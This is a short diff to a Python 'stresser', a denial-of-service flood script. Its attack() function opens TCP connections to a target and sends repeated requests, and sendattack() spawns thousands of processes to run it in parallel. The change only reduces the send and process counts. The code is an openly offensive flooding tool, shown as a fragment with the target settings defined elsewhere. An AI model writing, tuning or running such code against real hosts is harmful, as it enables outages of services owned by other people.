@@ -40,7 +40,7 @@ def attack(): # The root of the attack
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       # Attack processing starts here
-      for y in range(0, 500):
+      for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
       time.sleep(.1)
@@ -49,7 +49,7 @@ def attack(): # The root of the attack
 
 # Multiprocessing to make the stresser run on more processes
 def sendattack():
-  for i in range(0, 10000): # Number of Processes
+  for i in range(5000): # Number of Processes
     mp = multiprocessing.Process(target=attack)
     mp2 = multiprocessing.Process(target=attack)
     mp3 = multiprocessing.Process(target=attack)
